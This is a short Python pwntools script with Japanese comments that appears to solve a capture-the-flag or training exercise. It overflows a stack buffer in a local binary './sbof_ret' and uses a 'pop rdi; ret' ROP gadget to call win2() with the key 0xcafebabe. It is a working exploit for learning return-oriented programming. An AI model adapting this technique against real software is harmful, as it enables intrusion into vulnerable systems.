#!/usr/bin/env python3

from pwn import *
import sys
import struct

bin_file = './sbof_ret'
binf = ELF(bin_file)
rop = ROP(binf)

def attack(conn, **kwargs):

    rdi_gadget = rop.find_gadget(['pop rdi', 'ret'])
    print(f"Found pop rdi; ret at: {hex(rdi_gadget.address)}")

    exploit =  b'a' * 0x10                                        # nameへの書き込み
    exploit += struct.pack('<Q', 0x00000000deadbeef)              # 何でもよい
    exploit += struct.pack('<Q', rdi_gadget.address)              # 第一引数書き換えのためのROPガジェット
    exploit += struct.pack('<Q', 0x00000000cafebabe)              # win2()の第一引数key
    exploit += struct.pack('<Q', binf.functions['win2'].address)  # win2()のアドレス

    conn.sendline(exploit)
    print(conn.recvall().decode())

def main():

    conn = process(bin_file)
    attack(conn)

if __name__=='__main__':
    main()
